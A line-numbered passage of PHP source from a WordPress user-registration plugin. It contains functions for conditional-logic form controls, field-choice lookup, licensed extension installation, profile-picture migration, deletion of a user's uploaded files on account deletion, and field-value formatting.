| [2306](#L2306) | if ( isset( $connection['enable\_conditional\_logic'] ) && ur\_string\_to\_bool( $connection['enable\_conditional\_logic'] ) ) { |
| [2307](#L2307) |  |
| [2308](#L2308) | $checked = 'checked=checked'; |
| [2309](#L2309) | } |
| [2310](#L2310) | $output .= '<div class="ur-toggle-section ur-form-builder-toggle">'; |
| [2311](#L2311) | $output .= '<span class="user-registration-toggle-form">'; |
| [2312](#L2312) | $output .= '<input class="ur-use-conditional-logic" type="checkbox" name="ur\_use\_conditional\_logic" id="ur\_use\_conditional\_logic" ' . $checked . '>'; |
| [2313](#L2313) | $output .= '<span class="slider round">'; |
| [2314](#L2314) | $output .= '</span>'; |
| [2315](#L2315) | $output .= '</span>'; |
| [2316](#L2316) | $output .= '<label>' . esc\_html\_\_( 'Use conditional logics', 'user-registration' ) . '</label>'; |
| [2317](#L2317) | $output .= '</div>'; |
| [2318](#L2318) | $output .= '</div>'; |
| [2319](#L2319) |  |
| [2320](#L2320) | $output                .= '<div class="ur\_conditional\_logic\_wrapper" data-source="' . esc\_attr( $integration ) . '">'; |
| [2321](#L2321) | $output                .= '<h4>' . esc\_html\_\_( 'Conditional Rules', 'user-registration' ) . '</h4>'; |
| [2322](#L2322) | $output                .= '<div class="ur-logic"><p>' . esc\_html\_\_( 'Send data only if the following matches.', 'user-registration' ) . '</p></div>'; |
| [2323](#L2323) | $output                .= '<div class="ur-conditional-wrapper">'; |
| [2324](#L2324) | $output                .= '<select class="ur\_conditional\_field" name="ur\_conditional\_field">'; |
| [2325](#L2325) | $get\_all\_fields         = user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id( $form\_id, '' ); |
| [2326](#L2326) | $selected\_ur\_field\_type = ''; |
| [2327](#L2327) |  |
| [2328](#L2328) | if ( isset( $get\_all\_fields ) ) { |
| [2329](#L2329) |  |
| [2330](#L2330) | foreach ( $get\_all\_fields as $key => $field ) { |
| [2331](#L2331) | $selected\_attr = ''; |
| [2332](#L2332) |  |
| [2333](#L2333) | if ( isset( $connection['conditional\_logic\_data']['conditional\_field'] ) && $connection['conditional\_logic\_data']['conditional\_field'] === $key ) { |
| [2334](#L2334) | $selected\_attr          = 'selected=selected'; |
| [2335](#L2335) | $selected\_ur\_field\_type = $field['field\_key']; |
| [2336](#L2336) | } |
| [2337](#L2337) | $output .= '<option data-type="' . esc\_attr( $field['field\_key'] ) . '" data-label="' . esc\_attr( $field['label'] ) . '" value="' . esc\_attr( $key ) . '" ' . $selected\_attr . '>' . esc\_html( $field['label'] ) . '</option>'; |
| [2338](#L2338) | } |
| [2339](#L2339) | } |
| [2340](#L2340) | $output .= '</select>'; |
| [2341](#L2341) | $output .= '<select class="ur-conditional-condition" name="ur-conditional-condition">'; |
| [2342](#L2342) | $output .= '<option value="is" ' . ( isset( $connection['conditional\_logic\_data']['conditional\_operator'] ) && 'is' === $connection['conditional\_logic\_data']['conditional\_operator'] ? 'selected' : '' ) . '> is </option>'; |
| [2343](#L2343) | $output .= '<option value="is\_not" ' . ( isset( $connection['conditional\_logic\_data']['conditional\_operator'] ) && 'is\_not' === $connection['conditional\_logic\_data']['conditional\_operator'] ? 'selected' : '' ) . '> is not </option>'; |
| [2344](#L2344) | $output .= '</select>'; |
| [2345](#L2345) |  |
| [2346](#L2346) | if ( 'checkbox' == $selected\_ur\_field\_type || 'radio' == $selected\_ur\_field\_type || 'select' == $selected\_ur\_field\_type || 'country' == $selected\_ur\_field\_type || 'billing\_country' == $selected\_ur\_field\_type || 'shipping\_country' == $selected\_ur\_field\_type || 'select2' == $selected\_ur\_field\_type || 'multi\_select2' == $selected\_ur\_field\_type ) { |
| [2347](#L2347) | $choices = user\_registration\_pro\_get\_checkbox\_choices( $form\_id, $connection['conditional\_logic\_data']['conditional\_field'] ); |
| [2348](#L2348) | $output .= '<select name="ur-conditional-input" class="ur-conditional-input">'; |
| [2349](#L2349) |  |
| [2350](#L2350) | if ( is\_array( $choices ) && array\_filter( $choices ) ) { |
| [2351](#L2351) | $output .= '<option>--select--</option>'; |
| [2352](#L2352) |  |
| [2353](#L2353) | foreach ( $choices as $key => $choice ) { |
| [2354](#L2354) | $key           = 'country' == $selected\_ur\_field\_type ? $key : $choice; |
| [2355](#L2355) | $selectedvalue = isset( $connection['conditional\_logic\_data']['conditional\_value'] ) && $connection['conditional\_logic\_data']['conditional\_value'] == $key ? 'selected="selected"' : ''; |
| [2356](#L2356) | $output       .= '<option ' . $selectedvalue . ' value="' . esc\_attr( $key ) . '">' . esc\_html( $choice ) . '</option>'; |
| [2357](#L2357) | } |
| [2358](#L2358) | } else { |
| [2359](#L2359) | $selected = isset( $connection['conditional\_logic\_data']['conditional\_value'] ) ? $connection['conditional\_logic\_data']['conditional\_value'] : 0; |
| [2360](#L2360) | $output  .= '<option value="1" ' . ( ur\_string\_to\_bool( $selected ) ? 'selected="selected"' : '' ) . ' >' . esc\_html\_\_( 'Checked', 'user-registration' ) . '</option>'; |
| [2361](#L2361) | } |
| [2362](#L2362) | $output .= '</select>'; |
| [2363](#L2363) | } else { |
| [2364](#L2364) | $value   = isset( $connection['conditional\_logic\_data']['conditional\_value'] ) ? $connection['conditional\_logic\_data']['conditional\_value'] : ''; |
| [2365](#L2365) | $output .= '<input class="ur-conditional-input" type="text" name="ur-conditional-input" value="' . esc\_attr( $value ) . '">'; |
| [2366](#L2366) | } |
| [2367](#L2367) | $output .= '</div>'; |
| [2368](#L2368) | $output .= '</div>'; |
| [2369](#L2369) | $output .= '</div>'; |
| [2370](#L2370) | return $output; |
| [2371](#L2371) | } |
| [2372](#L2372) | } |
| [2373](#L2373) |  |
| [2374](#L2374) |  |
| [2375](#L2375) | if ( ! function\_exists( 'user\_registration\_pro\_get\_checkbox\_choices' ) ) { |
| [2376](#L2376) | /\*\* |
| [2377](#L2377) | \* Get Select and Checkbox Fields Choices |
| [2378](#L2378) | \* |
| [2379](#L2379) | \* @param int    $form\_id Form ID. |
| [2380](#L2380) | \* @param string $field\_name Field Name. |
| [2381](#L2381) | \* @return array $choices |
| [2382](#L2382) | \*/ |
| [2383](#L2383) | function user\_registration\_pro\_get\_checkbox\_choices( $form\_id, $field\_name ) { |
| [2384](#L2384) |  |
| [2385](#L2385) | $form\_data = (object) user\_registration\_pro\_get\_field\_data( $form\_id, $field\_name ); |
| [2386](#L2386) | /\* Backward Compatibility. Modified since 1.5.7. To be removed later. \*/ |
| [2387](#L2387) | $advance\_setting\_choices = isset( $form\_data->advance\_setting->choices ) ? $form\_data->advance\_setting->choices : ''; |
| [2388](#L2388) | $advance\_setting\_options = isset( $form\_data->advance\_setting->options ) ? $form\_data->advance\_setting->options : ''; |
| [2389](#L2389) | /\* Bacward Compatibility end.\*/ |
| [2390](#L2390) |  |
| [2391](#L2391) | $choices = isset( $form\_data->general\_setting->options ) ? $form\_data->general\_setting->options : ''; |
| [2392](#L2392) |  |
| [2393](#L2393) | /\* Backward Compatibility. Modified since 1.5.7. To be removed later. \*/ |
| [2394](#L2394) | if ( ! empty( $advance\_setting\_choices ) ) { |
| [2395](#L2395) | $choices = explode( ',', $advance\_setting\_choices ); |
| [2396](#L2396) | } elseif ( ! empty( $advance\_setting\_options ) ) { |
| [2397](#L2397) | $choices = explode( ',', $advance\_setting\_options ); |
| [2398](#L2398) | /\* Backward Compatibility end. \*/ |
| [2399](#L2399) |  |
| [2400](#L2400) | } elseif ( 'country' === $form\_data->field\_key ) { |
| [2401](#L2401) | $country = new UR\_Form\_Field\_Country(); |
| [2402](#L2402) | $country->get\_country(); |
| [2403](#L2403) | $choices = $country->get\_country(); |
| [2404](#L2404) | } |
| [2405](#L2405) |  |
| [2406](#L2406) | return $choices; |
| [2407](#L2407) | } |
| [2408](#L2408) | } |
| [2409](#L2409) |  |
| [2410](#L2410) | if ( ! function\_exists( 'user\_registration\_pro\_get\_field\_data' ) ) { |
| [2411](#L2411) | /\*\* |
| [2412](#L2412) | \* Get all fields data |
| [2413](#L2413) | \* |
| [2414](#L2414) | \* @param  int    $form\_id    Form ID. |
| [2415](#L2415) | \* @param  string $field\_name Field Name. |
| [2416](#L2416) | \* @return array    $field\_data. |
| [2417](#L2417) | \*/ |
| [2418](#L2418) | function user\_registration\_pro\_get\_field\_data( $form\_id, $field\_name ) { |
| [2419](#L2419) | $args      = array( |
| [2420](#L2420) | 'post\_type'   => 'user\_registration', |
| [2421](#L2421) | 'post\_status' => 'publish', |
| [2422](#L2422) | 'post\_\_in'    => array( $form\_id ), |
| [2423](#L2423) | ); |
| [2424](#L2424) | $post\_data = get\_posts( $args ); |
| [2425](#L2425) |  |
| [2426](#L2426) | if ( isset( $post\_data[0]->post\_content ) ) { |
| [2427](#L2427) | $post\_content\_array = json\_decode( $post\_data[0]->post\_content ); |
| [2428](#L2428) |  |
| [2429](#L2429) | foreach ( $post\_content\_array as $data ) { |
| [2430](#L2430) | foreach ( $data as $single\_data ) { |
| [2431](#L2431) | foreach ( $single\_data as $field\_data ) { |
| [2432](#L2432) | isset( $field\_data->general\_setting->field\_name ) ? $field\_data->general\_setting->field\_name : ''; |
| [2433](#L2433) | if ( $field\_data->general\_setting->field\_name === $field\_name ) { |
| [2434](#L2434) | return $field\_data; |
| [2435](#L2435) | } |
| [2436](#L2436) | } |
| [2437](#L2437) | } |
| [2438](#L2438) | } |
| [2439](#L2439) | } |
| [2440](#L2440) | } |
| [2441](#L2441) | } |
| [2442](#L2442) |  |
| [2443](#L2443) | if ( ! function\_exists( 'ur\_install\_extensions' ) ) { |
| [2444](#L2444) | /\*\* |
| [2445](#L2445) | \* This function return boolean according to string to avoid colision of 1, true, yes. |
| [2446](#L2446) | \* |
| [2447](#L2447) | \* @param [string] $name Name of the extension. |
| [2448](#L2448) | \* @param [string] $slug Slug of the extension. |
| [2449](#L2449) | \* @throws Exception Extension Download and activation unsuccessful message. |
| [2450](#L2450) | \*/ |
| [2451](#L2451) | function ur\_install\_extensions( $name, $slug ) { |
| [2452](#L2452) | try { |
| [2453](#L2453) |  |
| [2454](#L2454) | $plugin = 'user-registration-pro' === $slug ? plugin\_basename( sanitize\_text\_field( wp\_unslash( $slug . '/user-registration.php' ) ) ) : plugin\_basename( sanitize\_text\_field( wp\_unslash( $slug . '/' . $slug . '.php' ) ) ); |
| [2455](#L2455) | $status = array( |
| [2456](#L2456) | 'install' => 'plugin', |
| [2457](#L2457) | 'slug'    => sanitize\_key( wp\_unslash( $slug ) ), |
| [2458](#L2458) | ); |
| [2459](#L2459) |  |
| [2460](#L2460) | if ( ! current\_user\_can( 'install\_plugins' ) ) { |
| [2461](#L2461) | $status['errorMessage'] = esc\_html\_\_( 'Sorry, you are not allowed to install plugins on this site.', 'user-registration' ); |
| [2462](#L2462) |  |
| [2463](#L2463) | /\* translators: %1$s: Activation error message \*/ |
| [2464](#L2464) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2465](#L2465) | } |
| [2466](#L2466) |  |
| [2467](#L2467) | include\_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php'; |
| [2468](#L2468) | include\_once ABSPATH . 'wp-admin/includes/plugin-install.php'; |
| [2469](#L2469) |  |
| [2470](#L2470) | if ( file\_exists( WP\_PLUGIN\_DIR . '/' . $slug ) ) { |
| [2471](#L2471) | $plugin\_data          = get\_plugin\_data( WP\_PLUGIN\_DIR . '/' . $plugin ); |
| [2472](#L2472) | $status['plugin']     = $plugin; |
| [2473](#L2473) | $status['pluginName'] = $plugin\_data['Name']; |
| [2474](#L2474) |  |
| [2475](#L2475) | if ( current\_user\_can( 'activate\_plugin', $plugin ) && is\_plugin\_inactive( $plugin ) ) { |
| [2476](#L2476) | $result = activate\_plugin( $plugin ); |
| [2477](#L2477) |  |
| [2478](#L2478) | if ( is\_wp\_error( $result ) ) { |
| [2479](#L2479) | $status['errorCode']    = $result->get\_error\_code(); |
| [2480](#L2480) | $status['errorMessage'] = $result->get\_error\_message(); |
| [2481](#L2481) |  |
| [2482](#L2482) | /\* translators: %1$s: Activation error message \*/ |
| [2483](#L2483) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2484](#L2484) | } |
| [2485](#L2485) |  |
| [2486](#L2486) | $status['success'] = true; |
| [2487](#L2487) | $status['message'] = $name . ' has been installed and activated successfully'; |
| [2488](#L2488) |  |
| [2489](#L2489) | return $status; |
| [2490](#L2490) | } |
| [2491](#L2491) | } |
| [2492](#L2492) |  |
| [2493](#L2493) | $api = json\_decode( |
| [2494](#L2494) | UR\_Updater\_Key\_API::version( |
| [2495](#L2495) | array( |
| [2496](#L2496) | 'license'   => get\_option( 'user-registration\_license\_key' ), |
| [2497](#L2497) | 'item\_name' => $name, |
| [2498](#L2498) | ) |
| [2499](#L2499) | ) |
| [2500](#L2500) | ); |
| [2501](#L2501) |  |
| [2502](#L2502) | if ( is\_wp\_error( $api ) ) { |
| [2503](#L2503) | $status['errorMessage'] = $api->get\_error\_message(); |
| [2504](#L2504) |  |
| [2505](#L2505) | /\* translators: %1$s: Activation error message \*/ |
| [2506](#L2506) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2507](#L2507) | } |
| [2508](#L2508) |  |
| [2509](#L2509) | $status['pluginName'] = $api->name; |
| [2510](#L2510) | $api->version         = isset( $api->new\_version ) ? $api->new\_version : '1.0.0'; |
| [2511](#L2511) |  |
| [2512](#L2512) | $skin     = new WP\_Ajax\_Upgrader\_Skin(); |
| [2513](#L2513) | $upgrader = new Plugin\_Upgrader( $skin ); |
| [2514](#L2514) | $result   = $upgrader->install( $api->download\_link ); |
| [2515](#L2515) |  |
| [2516](#L2516) | if ( defined( 'WP\_DEBUG' ) && WP\_DEBUG ) { |
| [2517](#L2517) | $status['debug'] = $skin->get\_upgrade\_messages(); |
| [2518](#L2518) | } |
| [2519](#L2519) |  |
| [2520](#L2520) | if ( is\_wp\_error( $result ) ) { |
| [2521](#L2521) | $status['errorCode']    = $result->get\_error\_code(); |
| [2522](#L2522) | $status['errorMessage'] = $result->get\_error\_message(); |
| [2523](#L2523) |  |
| [2524](#L2524) | /\* translators: %1$s: Activation error message \*/ |
| [2525](#L2525) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2526](#L2526) | } elseif ( is\_wp\_error( $skin->result ) ) { |
| [2527](#L2527) | $status['errorCode']    = $skin->result->get\_error\_code(); |
| [2528](#L2528) | $status['errorMessage'] = $skin->result->get\_error\_message(); |
| [2529](#L2529) |  |
| [2530](#L2530) | /\* translators: %1$s: Activation error message \*/ |
| [2531](#L2531) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2532](#L2532) | } elseif ( $skin->get\_errors()->get\_error\_code() ) { |
| [2533](#L2533) | $status['errorMessage'] = $skin->get\_error\_messages(); |
| [2534](#L2534) |  |
| [2535](#L2535) | /\* translators: %1$s: Activation error message \*/ |
| [2536](#L2536) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2537](#L2537) | } elseif ( is\_null( $result ) ) { |
| [2538](#L2538) | global $wp\_filesystem; |
| [2539](#L2539) |  |
| [2540](#L2540) | $status['errorCode']    = 'unable\_to\_connect\_to\_filesystem'; |
| [2541](#L2541) | $status['errorMessage'] = esc\_html\_\_( 'Unable to connect to the filesystem. Please confirm your credentials.', 'user-registration' ); |
| [2542](#L2542) |  |
| [2543](#L2543) | // Pass through the error from WP\_Filesystem if one was raised. |
| [2544](#L2544) | if ( $wp\_filesystem instanceof WP\_Filesystem\_Base && is\_wp\_error( $wp\_filesystem->errors ) && $wp\_filesystem->errors->get\_error\_code() ) { |
| [2545](#L2545) | $status['errorMessage'] = esc\_html( $wp\_filesystem->errors->get\_error\_message() ); |
| [2546](#L2546) | } |
| [2547](#L2547) |  |
| [2548](#L2548) | /\* translators: %1$s: Activation error message \*/ |
| [2549](#L2549) | throw new Exception( sprintf( \_\_( '<strong>Activation error:</strong> %1$s', 'user-registration' ), $status['errorMessage'] ) ); |
| [2550](#L2550) | } |
| [2551](#L2551) |  |
| [2552](#L2552) | $install\_status = install\_plugin\_install\_status( $api ); |
| [2553](#L2553) |  |
| [2554](#L2554) | if ( current\_user\_can( 'activate\_plugin', $install\_status['file'] ) ) { |
| [2555](#L2555) | if ( is\_plugin\_inactive( $install\_status['file'] ) ) { |
| [2556](#L2556) | $status['activateUrl'] = |
| [2557](#L2557) | esc\_url\_raw( |
| [2558](#L2558) | add\_query\_arg( |
| [2559](#L2559) | array( |
| [2560](#L2560) | 'action'   => 'activate', |
| [2561](#L2561) | 'plugin'   => $install\_status['file'], |
| [2562](#L2562) | '\_wpnonce' => wp\_create\_nonce( 'activate-plugin\_' . $install\_status['file'] ), |
| [2563](#L2563) | ), |
| [2564](#L2564) | admin\_url( 'admin.php?page=user-registration-addons' ) |
| [2565](#L2565) | ) |
| [2566](#L2566) | ); |
| [2567](#L2567) | } else { |
| [2568](#L2568) | $status['deActivateUrl'] = |
| [2569](#L2569) | esc\_url\_raw( |
| [2570](#L2570) | add\_query\_arg( |
| [2571](#L2571) | array( |
| [2572](#L2572) | 'action'   => 'deactivate', |
| [2573](#L2573) | 'plugin'   => $install\_status['file'], |
| [2574](#L2574) | '\_wpnonce' => wp\_create\_nonce( 'deactivate-plugin\_' . $install\_status['file'] ), |
| [2575](#L2575) | ), |
| [2576](#L2576) | admin\_url( 'admin.php?page=user-registration-addons' ) |
| [2577](#L2577) | ) |
| [2578](#L2578) | ); |
| [2579](#L2579) | } |
| [2580](#L2580) | } |
| [2581](#L2581) |  |
| [2582](#L2582) | $status['success'] = true; |
| [2583](#L2583) | $status['message'] = $name . ' has been installed and activated successfully'; |
| [2584](#L2584) |  |
| [2585](#L2585) | return $status; |
| [2586](#L2586) |  |
| [2587](#L2587) | } catch ( Exception $e ) { |
| [2588](#L2588) |  |
| [2589](#L2589) | $message           = $e->getMessage(); |
| [2590](#L2590) | $status['success'] = false; |
| [2591](#L2591) | $status['message'] = $message; |
| [2592](#L2592) |  |
| [2593](#L2593) | return $status; |
| [2594](#L2594) | } |
| [2595](#L2595) | } |
| [2596](#L2596) | } |
| [2597](#L2597) |  |
| [2598](#L2598) | add\_action( 'user\_registration\_init', 'ur\_profile\_picture\_migration\_script' ); |
| [2599](#L2599) |  |
| [2600](#L2600) | if ( ! function\_exists( 'ur\_profile\_picture\_migration\_script' ) ) { |
| [2601](#L2601) |  |
| [2602](#L2602) | /\*\* |
| [2603](#L2603) | \* Update usermeta from profile\_pic\_url to attachemnt id and move files to new directory. |
| [2604](#L2604) | \* |
| [2605](#L2605) | \* @since 1.5.0. |
| [2606](#L2606) | \*/ |
| [2607](#L2607) | function ur\_profile\_picture\_migration\_script() { |
| [2608](#L2608) |  |
| [2609](#L2609) | if ( ! get\_option( 'ur\_profile\_picture\_migrated', false ) ) { |
| [2610](#L2610) |  |
| [2611](#L2611) | $users = get\_users( |
| [2612](#L2612) | array( |
| [2613](#L2613) | 'meta\_key' => 'user\_registration\_profile\_pic\_url', |
| [2614](#L2614) | ) |
| [2615](#L2615) | ); |
| [2616](#L2616) |  |
| [2617](#L2617) | foreach ( $users as $user ) { |
| [2618](#L2618) | $user\_registration\_profile\_pic\_url = get\_user\_meta( $user->ID, 'user\_registration\_profile\_pic\_url', true ); |
| [2619](#L2619) |  |
| [2620](#L2620) | if ( ! is\_numeric( $user\_registration\_profile\_pic\_url ) ) { |
| [2621](#L2621) | $user\_registration\_profile\_pic\_attachment = attachment\_url\_to\_postid( $user\_registration\_profile\_pic\_url ); |
| [2622](#L2622) | if ( 0 != $user\_registration\_profile\_pic\_attachment ) { |
| [2623](#L2623) | update\_user\_meta( $user->ID, 'user\_registration\_profile\_pic\_url', absint( $user\_registration\_profile\_pic\_attachment ) ); |
| [2624](#L2624) | } |
| [2625](#L2625) | } |
| [2626](#L2626) | } |
| [2627](#L2627) |  |
| [2628](#L2628) | update\_option( 'ur\_profile\_picture\_migrated', true ); |
| [2629](#L2629) | } |
| [2630](#L2630) | } |
| [2631](#L2631) | } |
| [2632](#L2632) |  |
| [2633](#L2633) | add\_action( 'delete\_user', 'ur\_delete\_user\_files\_on\_user\_delete', 10, 3 ); |
| [2634](#L2634) |  |
| [2635](#L2635) | if ( ! function\_exists( 'ur\_delete\_user\_files\_on\_user\_delete' ) ) { |
| [2636](#L2636) |  |
| [2637](#L2637) | /\*\* |
| [2638](#L2638) | \* Delete user uploaded files when user is deleted. |
| [2639](#L2639) | \* |
| [2640](#L2640) | \* @param [type] $user\_id User Id. |
| [2641](#L2641) | \* @param [type] $reassign  Reassign to another user ( admin ). |
| [2642](#L2642) | \* @param [type] $user User Data. |
| [2643](#L2643) | \*/ |
| [2644](#L2644) | function ur\_delete\_user\_files\_on\_user\_delete( $user\_id, $reassign, $user ) { |
| [2645](#L2645) |  |
| [2646](#L2646) | // Return if reassign is set. |
| [2647](#L2647) | if ( null !== $reassign ) { |
| [2648](#L2648) | return; |
| [2649](#L2649) | } |
| [2650](#L2650) |  |
| [2651](#L2651) | // Delete user uploaded file when user is deleted. |
| [2652](#L2652) | if ( class\_exists( 'URFU\_Uploaded\_Data' ) ) { |
| [2653](#L2653) | $post = get\_post( ur\_get\_form\_id\_by\_userid( $user\_id ) ); |
| [2654](#L2654) |  |
| [2655](#L2655) | $form\_data\_object = json\_decode( $post->post\_content ); |
| [2656](#L2656) |  |
| [2657](#L2657) | $file\_fields = URFU\_Uploaded\_Data::get\_file\_field( $form\_data\_object ); |
| [2658](#L2658) |  |
| [2659](#L2659) | foreach ( $file\_fields as $field ) { |
| [2660](#L2660) |  |
| [2661](#L2661) | $meta\_key = isset( $field['key'] ) ? $field['key'] : ''; |
| [2662](#L2662) |  |
| [2663](#L2663) | $attachment\_ids = explode( ',', get\_user\_meta( $user->ID, 'user\_registration\_' . $meta\_key, true ) ); |
| [2664](#L2664) |  |
| [2665](#L2665) | foreach ( $attachment\_ids as $attachment\_id ) { |
| [2666](#L2666) | $file\_path = get\_attached\_file( $attachment\_id ); |
| [2667](#L2667) |  |
| [2668](#L2668) | if ( file\_exists( $file\_path ) ) { |
| [2669](#L2669) | unlink( $file\_path ); |
| [2670](#L2670) | } |
| [2671](#L2671) | } |
| [2672](#L2672) | } |
| [2673](#L2673) | } |
| [2674](#L2674) |  |
| [2675](#L2675) | // Delete user uploaded profile image when user is deleted. |
| [2676](#L2676) | $profile\_pic\_attachment\_id = get\_user\_meta( $user\_id, 'user\_registration\_profile\_pic\_url', true ); |
| [2677](#L2677) |  |
| [2678](#L2678) | $pic\_path = get\_attached\_file( $profile\_pic\_attachment\_id ); |
| [2679](#L2679) |  |
| [2680](#L2680) | if ( file\_exists( $pic\_path ) ) { |
| [2681](#L2681) | unlink( $pic\_path ); |
| [2682](#L2682) | } |
| [2683](#L2683) | } |
| [2684](#L2684) | } |
| [2685](#L2685) |  |
| [2686](#L2686) | if ( ! function\_exists( 'ur\_format\_field\_values' ) ) { |
| [2687](#L2687) |  |
| [2688](#L2688) | /\*\* |
| [2689](#L2689) | \* Get field type by meta key |
| [2690](#L2690) | \* |
| [2691](#L2691) | \* @param int    $field\_meta\_key Field key or meta key. |
| [2692](#L2692) | \* @param string $field\_value Field's value . |
| [2693](#L2693) | \*/ |
| [2694](#L2694) | function ur\_format\_field\_values( $field\_meta\_key, $field\_value ) { |
| [2695](#L2695) | if ( strpos( $field\_meta\_key, 'user\_registration\_' ) ) { |
| [2696](#L2696) | $field\_meta\_key = substr( $field\_meta\_key, 0, strpos( $field\_meta\_key, 'user\_registration\_' ) ); |
| [2697](#L2697) | } |
| [2698](#L2698) |  |
| [2699](#L2699) | $user\_id = isset( $\_GET['user'] ) ? sanitize\_text\_field( wp\_unslash( $\_GET['user'] ) ) : get\_current\_user\_id(); |
| [2700](#L2700) | $user\_id = isset( $\_GET['user\_id'] ) ? sanitize\_text\_field( wp\_unslash( $\_GET['user\_id'] ) ) : $user\_id; |
| [2701](#L2701) | $form\_id = isset( $\_POST['form\_id'] ) ? sanitize\_text\_field( wp\_unslash( $\_POST['form\_id'] ) ) : ur\_get\_form\_id\_by\_userid( $user\_id ); //phpcs:ignore |
| [2702](#L2702) |  |
| [2703](#L2703) | $field\_name = ur\_get\_field\_data\_by\_field\_name( $form\_id, $field\_meta\_key ); |
| [2704](#L2704) | $field\_key  = isset( $field\_name['field\_key'] ) ? $field\_name['field\_key'] : ''; |
| [2705](#L2705) |  |
| [2706](#L2706) | switch ( $field\_key ) { |
| [2707](#L2707) | case 'checkbox': |
| [2708](#L2708) | case 'multi\_select2': |
| [2709](#L2709) | $field\_value = ( is\_array( $field\_value ) && ! empty( $field\_value ) ) ? implode( ', ', $field\_value ) : $field\_value; |
| [2710](#L2710) | break; |
| [2711](#L2711) | case 'country': |
| [2712](#L2712) | $countries = UR\_Form\_Field\_Country::get\_instance()->get\_country(); |
| [2713](#L2713) | if ( ! isset( $countries[ $field\_value ] ) ) { |
| [2714](#L2714) | $key = array\_search( $field\_value, $countries, true ); |
| [2715](#L2715) | if ( $key ) { |
| [2716](#L2716) | $field\_value = $key; |
| [2717](#L2717) | } |
| [2718](#L2718) | } |
| [2719](#L2719) | $field\_value = isset( $countries[ $field\_value ] ) ? $countries[ $field\_value ] : ''; |
| [2720](#L2720) | break; |
| [2721](#L2721) | case 'file': |
| [2722](#L2722) | $attachment\_ids = is\_array( $field\_value ) ? $field\_value : explode( ',', $field\_value ); |
| [2723](#L2723) | $links          = array(); |
| [2724](#L2724) |  |
| [2725](#L2725) | foreach ( $attachment\_ids as $attachment\_id ) { |
| [2726](#L2726) | if ( is\_numeric( $attachment\_id ) ) { |
| [2727](#L2727) | $attachment\_url = '<a href="' . wp\_get\_attachment\_url( $attachment\_id ) . '">' . basename( get\_attached\_file( $attachment\_id ) ) . '</a>'; |
| [2728](#L2728) | array\_push( $links, $attachment\_url ); |
| [2729](#L2729) | } elseif ( ur\_is\_valid\_url( $attachment\_id ) ) { |
| [2730](#L2730) | $attachment\_url = '<a href="' . $attachment\_id . '">' . $attachment\_id . '</a>'; |
| [2731](#L2731) | array\_push( $links, $attachment\_url ); |
| [2732](#L2732) | } else { |
| [2733](#L2733) | array\_push( $links, $attachment\_id ); |
| [2734](#L2734) | } |
| [2735](#L2735) | } |
| [2736](#L2736) |  |
| [2737](#L2737) | $field\_value = implode( ', ', $links ); |
| [2738](#L2738) |  |
| [2739](#L2739) | break; |
| [2740](#L2740) | case 'privacy\_policy': |
| [2741](#L2741) | if ( ur\_string\_to\_bool( $field\_value ) ) { |
| [2742](#L2742) | $field\_value = 'Checked'; |
| [2743](#L2743) | } else { |
| [2744](#L2744) | $field\_value = 'Not Checked'; |
| [2745](#L2745) | } |
| [2746](#L2746) | break; |
| [2747](#L2747) | case 'wysiwyg': |
| [2748](#L2748) | $field\_value = html\_entity\_decode( $field\_value ); |
| [2749](#L2749) | break; |
| [2750](#L2750) | case 'profile\_picture': |
| [2751](#L2751) | $field\_value = '<img class="profile-preview" alt="Profile Picture" width="50px" height="50px" src="' . ( is\_numeric( $field\_value ) ? esc\_url( wp\_get\_attachment\_url( $field\_value ) ) : esc\_url( $field\_value ) ) . '" />'; |
| [2752](#L2752) | $field\_value = wp\_kses\_post( $field\_value ); |
| [2753](#L2753) | break; |
| [2754](#L2754) | default: |
| [2755](#L2755) | $field\_value = $field\_value; |
| [2756](#L2756) | break; |
| [2757](#L2757) | } |
| [2758](#L2758) |  |
| [2759](#L2759) | return $field\_value; |
| [2760](#L2760) | } |
| [2761](#L2761) | } |
| [2762](#L2762) |  |
| [2763](#L2763) | add\_action( 'admin\_init', 'user\_registration\_install\_pages\_notice' ); |
| [2764](#L2764) |  |
| [2765](#L2765) | if ( ! function\_exists( 'user\_registration\_install\_pages\_notice' ) ) { |
| [2766](#L2766) | /\*\* |
| [2767](#L2767) | \* Display install pages notice if the user has skipped getting started. |
| [2768](#L2768) | \* |
| [2769](#L2769) | \* @since 2.2.3 |
| [2770](#L2770) | \*/ |
| [2771](#L2771) | function user\_registration\_install\_pages\_notice() { |
| [2772](#L2772) |  |
| [2773](#L2773) | if ( get\_option( 'user\_registration\_onboarding\_skipped', false ) ) { |
| [2774](#L2774) | UR\_Admin\_Notices::add\_notice( 'install' ); |
| [2775](#L2775) | } |
| [2776](#L2776) |  |
| [2777](#L2777) | if ( isset( $\_POST['user\_registration\_myaccount\_page\_id'] ) ) { //phpcs:ignore |
| [2778](#L2778) | $my\_account\_page = $\_POST['user\_registration\_myaccount\_page\_id']; //phpcs:ignore |
| [2779](#L2779) | } else { |
| [2780](#L2780) | $my\_account\_page = get\_option( 'user\_registration\_myaccount\_page\_id', 0 ); |
| [2781](#L2781) | } |
| [2782](#L2782) |  |
| [2783](#L2783) | $matched        = 0; |
| [2784](#L2784) | $myaccount\_page = array(); |
| [2785](#L2785) |  |
| [2786](#L2786) | if ( $my\_account\_page ) { |
| [2787](#L2787) | $myaccount\_page = get\_post( $my\_account\_page ); |
| [2788](#L2788) | } |
| [2789](#L2789) |  |
| [2790](#L2790) | if ( ! empty( $myaccount\_page ) ) { |
| [2791](#L2791) | $shortcodes = parse\_blocks( $myaccount\_page->post\_content ); |
| [2792](#L2792) | $matched    = ur\_find\_my\_account\_in\_page( $shortcodes, $myaccount\_page, $matched ); |
| [2793](#L2793) | } |
| [2794](#L2794) |  |
| [2795](#L2795) | if ( 0 === $matched ) { |
